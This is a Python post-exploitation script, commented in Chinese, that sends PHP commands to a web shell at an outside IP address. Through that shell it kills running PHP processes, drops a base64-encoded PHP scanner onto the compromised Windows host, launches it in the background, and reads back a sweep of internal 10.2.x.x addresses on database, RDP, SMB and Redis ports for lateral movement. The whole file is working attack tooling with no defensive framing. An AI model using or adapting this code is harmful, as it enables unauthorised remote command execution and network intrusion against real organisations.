#!/usr/bin/env python3
"""重写并发横向扫描器 (stream_select 非阻塞, 每批100并发)"""
import urllib.request, urllib.parse, time, base64

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 并发扫描器: 每个IP 8端口用非阻塞socket批量测, 0.3s超时
scanner = r'''<?php
set_time_limit(0);
$ports = [80,443,3306,3389,22,445,6379,8080,9096];
$out = "C:/phpScan/lateral.txt";
@unlink($out);
$fh = fopen($out, "a");
$targets = array();
for ($b = 0; $b <= 3; $b++) {
  for ($i = 1; $i <= 254; $i++) {
    $ip = "10.2." . $b . "." . $i;
    if ($ip == "10.2.0.4") continue;
    foreach ($ports as $p) { $targets[] = array($ip, $p); }
  }
}
$total = count($targets);
$batch = 200;
for ($start = 0; $start < $total; $start += $batch) {
  $chunk = array_slice($targets, $start, $batch);
  $socks = array();
  $info = array();
  foreach ($chunk as $t) {
    $s = @stream_socket_client("tcp://" . $t[0] . ":" . $t[1], $e, $es, 0.3, STREAM_CLIENT_ASYNC_CONNECT);
    if ($s) { $socks[(int)$s] = $s; $info[(int)$s] = $t; }
  }
  if ($socks) {
    $w = $socks; $r = null; $x = null;
    @stream_select($r, $w, $x, 1);
    foreach ($w as $s) {
      $t = $info[(int)$s];
      fwrite($fh, $t[0] . ":" . $t[1] . "\n");
      fflush($fh);
      fclose($s);
    }
  }
  if ($start % 4000 == 0) { fwrite($fh, "#PROGRESS " . min($start+$batch, $total) . "/$total\n"); fflush($fh); }
}
fwrite($fh, "#DONE\n");
fclose($fh);
echo "FINISHED";
?>'''
b64 = base64.b64encode(scanner.encode()).decode()

# 杀旧扫描 + 写新扫描器 + 启动
code = f"system('taskkill /f /im php.exe 2>nul & C:/phpStudy/php/php-5.4.45/php.exe -r \"file_put_contents(\\\"C:/phpScan/lateral.php\\\", base64_decode(\\\"{b64}\\\"));\" 2>&1');print_r('W:' . filesize('C:/phpScan/lateral.php'));"
r = cmd(code, 30)
print("1. 重写:", r.strip()[-60:], flush=True)

code2 = "pclose(popen('start /b cmd /c \"C:/phpStudy/php/php-5.4.45/php.exe C:/phpScan/lateral.php > C:/phpScan/lateral_run.log 2>&1\"', 'r'));print_r('STARTED');"
r = cmd(code2, 25)
print("2. 启动:", r.strip()[-40:], flush=True)
time.sleep(20)

r = cmd("print_r(file_get_contents('C:/phpScan/lateral.txt'));", 20)
print("3. 20秒结果:", r.strip()[-500:], flush=True)
